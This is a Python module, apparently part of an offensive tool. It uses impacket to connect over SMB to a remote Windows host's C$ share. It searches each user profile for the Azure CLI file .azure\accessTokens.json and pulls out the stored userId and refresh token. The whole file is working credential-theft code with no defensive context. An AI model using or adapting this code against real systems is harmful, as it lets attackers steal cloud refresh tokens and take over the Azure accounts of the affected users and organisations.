import json
import logging
from io import BytesIO

from impacket import smbconnection

from connection_class import Connection


class File:
    def __init__(self, reg_connection: Connection):
        self.connection = reg_connection
        self.logger = logging.getLogger(__name__)

    def read_file(self, share: str, path: str) -> bytes:
        """
        reads file content from the remote connection
        :param path: path to the remote file
        :param share: share of the remote file
        :return: the file content
        """
        fh = BytesIO()
        try:
            self.connection.connection.getFile(share, path, fh.write)
        except Exception as e:
            raise e

        return fh.getvalue()

    def search_for_azure_file(self):
        """
        Function that search for .azure folder and read the refreshToken in accessTokens file
        :return:
        """
        for folder in self.connection.connection.listPath("C$", "Users" + r"\*"):
            folder_name = folder.get_shortname().replace("@{Name=", "").replace("}", "")
            if folder.get_longname() not in (
                    ".", "..", "Public", "Default", "Default User", "All Users") and folder.is_directory():
                try:
                    file = json.loads(self.read_file("C$", f"Users\\{folder_name}\\.azure\\accessTokens.json"))
                    return {f"Users\\{folder_name}\\.azure\\accessTokens.json": {
                        file[0]['userId']: file[0]['refreshToken']}}
                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    self.logger.debug("'accessTokens.json' File not found")

